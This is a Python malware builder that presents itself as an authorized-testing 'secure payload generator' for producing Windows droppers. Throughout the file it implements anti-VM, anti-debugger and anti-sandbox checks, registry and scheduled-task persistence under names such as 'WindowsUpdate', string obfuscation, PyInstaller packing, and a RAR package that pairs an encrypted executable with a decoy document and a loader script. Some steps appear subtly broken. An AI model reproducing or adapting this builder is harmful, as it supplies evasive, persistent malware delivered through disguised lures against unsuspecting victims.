#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# LEGAL USE ONLY - AUTHORIZED SECURITY TESTING ONLY

import os
import sys
import ctypes
import tempfile
import platform
import hashlib
import base64
import subprocess
import datetime
import socket
import shutil
import rarfile
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class SecurityConfig:
    """Enhanced security configuration"""
    def __init__(self):
        # Evasion settings
        self.anti_vm = True
        self.anti_debug = True
        self.anti_sandbox = True
        self.obfuscation_level = 3  # 1-5
        
        # Persistence methods
        self.persistence_methods = ['registry', 'scheduled_task']
        
        # Delivery settings
        self.decoy_extension = '.docx'
        self.decoy_filename = 'Annual_Report.docx'
        self.icon = None
        
        # Safety controls
        self.geo_fencing = ['US', 'GB']  # ISO country codes
        self.time_window = (8, 17)  # 8AM-5PM
        self.max_runtime = 300  # seconds

class PolymorphicEngine:
    """Code obfuscation engine"""
    @staticmethod
    def obfuscate(code, level=3):
        if level < 1:
            return code
            
        # Variable renaming
        var_map = {}
        counter = 0
        for line in code.split('\n'):
            if ' = ' in line:
                var = line.split(' = ')[0].strip()
                if var not in var_map:
                    var_map[var] = f'_{counter}x{hashlib.md5(var.encode()).hexdigest()[:4]}'
                    counter += 1
        
        # String encryption
        strings = []
        def encrypt_string(match):
            s = match.group(1)
            strings.append(base64.b85encode(s.encode()).decode())
            return f'__str{len(strings)-1}__'
        
        # Apply transformations
        import re
        code = re.sub(r'\"(.+?)\"', encrypt_string, code)
        
        # Add junk code
        if level > 2:
            junk = [
                'for _ in range(3): pass',
                'try: pass\nexcept: pass',
                '__import__("sys")._clear_type_cache()'
            ]
            for _ in range(level):
                code = code.replace('\n', '\n' + junk[_ % len(junk)] + '\n', 1)
        
        return code

class SecurePayloadGenerator:
    def __init__(self, config=SecurityConfig()):
        self.config = config
        self.temp_dir = tempfile.mkdtemp(prefix='tmp_')
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        
    def _environment_checks(self):
        """Safety checks before execution"""
        checks = []
        
        # Geographic fencing
        if self.config.geo_fencing:
            try:
                import geocoder
                country = geocoder.ip('me').country
                if country not in self.config.geo_fencing:
                    checks.append(f"Geo-fencing violation ({country})")
            except:
                checks.append("Geo-check failed")
        
        # Time window
        now = datetime.datetime.now()
        if not (self.config.time_window[0] <= now.hour <= self.config.time_window[1]):
            checks.append("Outside operational time window")
        
        return checks
    
    def _generate_secure_payload(self):
        """Generate polymorphic payload with evasion"""
        template = f'''
import os
import sys
import ctypes
import time
import platform
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

class SecurityChecks:
    @staticmethod
    def check_vm():
        try:
            indicators = ["vbox", "vmware", "qemu", "hyperv"]
            with open(r'C:\\Windows\\System32\\drivers\\etc\\hosts') as f:
                if any(i in f.read().lower() for i in indicators):
                    return True
            return ctypes.windll.kernel32.GetModuleHandleW("SbieDll.dll") is not None
        except:
            return True

    @staticmethod 
    def check_debugger():
        return ctypes.windll.kernel32.IsDebuggerPresent()

    @staticmethod
    def check_sandbox():
        try:
            if ctypes.windll.kernel32.GetTickCount() < 300000:
                return True
            if os.cpu_count() < 2:
                return True
            return False
        except:
            return True

class Persistence:
    @staticmethod
    def install():
        try:
            # Registry persistence
            key = ctypes.c_void_p()
            ctypes.windll.advapi32.RegCreateKeyExA(
                0x80000002, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, None, 0, 0xF003F, None, ctypes.byref(key), None
            )
            ctypes.windll.advapi32.RegSetValueExA(
                key, "WindowsUpdate", 0, 1, sys.argv[0], len(sys.argv[0])
            )
            
            # Scheduled task
            cmd = f'schtasks /create /tn "SystemMaintenance" /tr "\\"{sys.argv[0]}\\"" /sc hourly /f'
            subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass

def main():
    # Environment validation
    if any([
        platform.system() != 'Windows',
        SecurityChecks.check_vm(),
        SecurityChecks.check_debugger(), 
        SecurityChecks.check_sandbox()
    ]):
        sys.exit(0)
    
    # Install persistence
    Persistence.install()
    
    # Execute payload (replace with your actual payload)
    try:
        os.system("calc.exe")
    except:
        pass

if __name__ == "__main__":
    try:
        main()
    except:
        sys.exit(0)
'''
        return PolymorphicEngine.obfuscate(template, self.config.obfuscation_level)

    def _build_executable(self, script_content, output_path):
        """Secure build process with anti-scanning"""
        script_path = os.path.join(self.temp_dir, 'payload.py')
        with open(script_path, 'w', encoding='utf-8') as f:
            f.write(script_content)
        
        cmd = [
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--name', os.path.splitext(os.path.basename(output_path))[0],
            '--distpath', os.path.dirname(output_path),
            '--workpath', os.path.join(self.temp_dir, 'build'),
            '--specpath', self.temp_dir,
            '--key', hashlib.sha256(os.urandom(32)).hexdigest()[:16],
            script_path
        ]
        
        if self.config.icon:
            cmd.extend(['--icon', self.config.icon])
        
        try:
            subprocess.run(cmd, check=True, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError as e:
            print(f"[!] Build failed: {e.stderr.decode()}")
            return False

    def _package_payload(self, payload_path, output_file, decoy_content=None):
        """Create secure delivery package"""
        try:
            with rarfile.RarFile(output_file, 'w') as rf:
                # Add payload (encrypted)
                with open(payload_path, 'rb') as f:
                    encrypted = self.cipher.encrypt(f.read())
                rf.writestr('sysprep.exe', encrypted)
                
                # Add decoy document
                decoy_content = decoy_content or b'Dummy document content'
                rf.writestr(self.config.decoy_filename, decoy_content)
                
                # Add loader script
                loader = f'''
@echo off
set "key={self.encryption_key.decode()}"
certutil -decode sysprep.exe payload.bin >nul
python -c "from cryptography.fernet import Fernet;f=Fernet('%key%');\
open('payload.exe','wb').write(f.decrypt(open('payload.bin','rb').read()))" && \
start payload.exe
del payload.bin
start "" "{self.config.decoy_filename}"
'''.encode()
                rf.writestr('setup.cmd', loader)
            
            return True
        except Exception as e:
            print(f"[!] Packaging failed: {str(e)}")
            return False

    def generate(self, output_path, decoy_content=None):
        """Main generation workflow"""
        try:
            # Environment validation
            if checks := self._environment_checks():
                print(f"[!] Safety checks failed: {', '.join(checks)}")
                return False
            
            print("[*] Generating polymorphic payload...")
            payload_script = self._generate_secure_payload()
            
            print("[*] Building executable...")
            exe_path = os.path.join('dist', 'payload.exe')
            if not self._build_executable(payload_script, exe_path):
                return False
            
            print("[*] Packaging delivery...")
            if not self._package_payload(exe_path, output_path, decoy_content):
                return False
            
            print(f"[+] Successfully generated: {output_path}")
            print(f"[*] Encryption key: {self.encryption_key.decode()}")
            return True
            
        except Exception as e:
            print(f"[!] Critical error: {str(e)}")
            return False
        finally:
            self._cleanup()

    def _cleanup(self):
        """Secure cleanup of artifacts"""
        dirs = [self.temp_dir, 'build', '__pycache__']
        for d in dirs:
            if os.path.exists(d):
                try:
                    shutil.rmtree(d)
                except:
                    pass
        if os.path.exists('payload.spec'):
            try:
                os.remove('payload.spec')
            except:
                pass

if __name__ == "__main__":
    print("""
    SECURE PAYLOAD GENERATOR
    Authorized use only - Compliance required
    """)
    
    # Example usage with safety checks
    config = SecurityConfig()
    config.obfuscation_level = 4
    config.persistence_methods = ['registry']
    
    generator = SecurePayloadGenerator(config)
    if generator.generate('Contract_Document.rar'):
        print("[+] Generation completed successfully")
    else:
        print("[!] Generation failed")
        sys.exit(1)